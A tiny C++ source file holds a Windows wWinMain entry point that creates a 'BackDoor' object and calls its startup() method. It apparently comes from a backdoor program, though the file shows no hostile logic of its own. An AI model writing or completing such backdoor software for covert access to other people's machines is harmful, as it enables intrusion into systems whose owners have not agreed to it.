
#include "BackDoor.h"
#include <iostream>
#include <stdio.h>
#include <Windows.h>


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    BackDoor* bd = new BackDoor();
    bd->startup();
}

